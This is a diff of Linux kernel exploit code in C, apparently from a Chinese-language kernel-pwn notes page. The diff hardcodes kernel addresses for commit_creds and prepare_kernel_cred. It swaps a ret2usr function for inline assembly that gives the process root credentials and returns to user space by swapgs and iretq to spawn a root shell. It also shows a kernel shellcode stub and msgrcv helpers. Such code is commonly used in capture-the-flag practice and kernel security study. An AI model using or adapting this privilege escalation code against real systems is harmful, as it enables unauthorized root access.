@@ -51,8 +51,8 @@ PS:更新与`2026-07-26`<br>
 #include <stdint.h>
 
 
-size_t commit_creds=0;
-size_t prepare_kernel_cred =0;
+size_t commit_creds= 0xffffffff814c6410;
+size_t prepare_kernel_cred =0xffffffff814c67f0;
 
 size_t user_cs;
 size_t user_ss;
@@ -80,12 +80,29 @@ void get_root_shell(void){
 }
 
 // ret2usr
-void get_root_privilege(){
-    //printf("use ret2usr\n"); //don't use user func in kernel space!
-    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
-    int (*commit_creds_ptr)(void *) = commit_creds;
-    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
+unsigned long user_rip = (unsigned long)get_root_shell;
+void escalate_privs(void){
+    __asm__(
+        "movabs rax, prepare_kernel_cred;" //prepare_kernel_cred
+        "xor rdi, rdi;"
+	    "call rax; mov rdi, rax;"
+	    "movabs rax, commit_creds;" //commit_creds
+	    "call rax;"
+        "swapgs;"
+        "mov r15, user_ss;"
+        "push r15;"
+        "mov r15, user_sp;"
+        "push r15;"
+        "mov r15, user_rflags;"
+        "push r15;"
+        "mov r15, user_cs;"
+        "push r15;"
+        "mov r15, user_rip;"
+        "push r15;"
+        "iretq;"
+    );
 }
+
 
 // kernel shellcode
 __attribute__((naked, noinline)) void privilege_escalation_kernel_shellcode(){
@@ -185,6 +202,7 @@ void msg_recv(int msg_id, void *msg_addr,int msg_size,int msg_type, int flag){
         fatal("msgrcv");
     }
 }
+
 ```
 
 
